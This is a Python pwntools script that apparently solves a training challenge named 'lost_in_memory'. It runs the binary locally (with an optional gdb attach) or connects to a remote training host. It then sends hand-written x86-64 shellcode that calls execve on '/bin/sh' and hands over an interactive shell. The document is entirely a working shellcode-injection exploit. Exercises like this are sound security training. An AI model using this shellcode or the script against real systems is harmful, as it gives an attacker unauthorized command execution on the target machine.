from pwn import *
import sys

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./lost_in_memory")
        #breakpoint at the start of the shellcode
        gdb.attach(c, """
        c
        """)
        input("Wait")
    elif(sys.argv[1] == '-r'):
        c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./lost_in_memory")

shellcode="""
    nop
    nop
    nop
    nop
    xor rax, rax
    mov rax, 0x3b
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    syscall
"""

c.sendline(asm(shellcode))
c.recvuntil(b' >')
c.interactive()
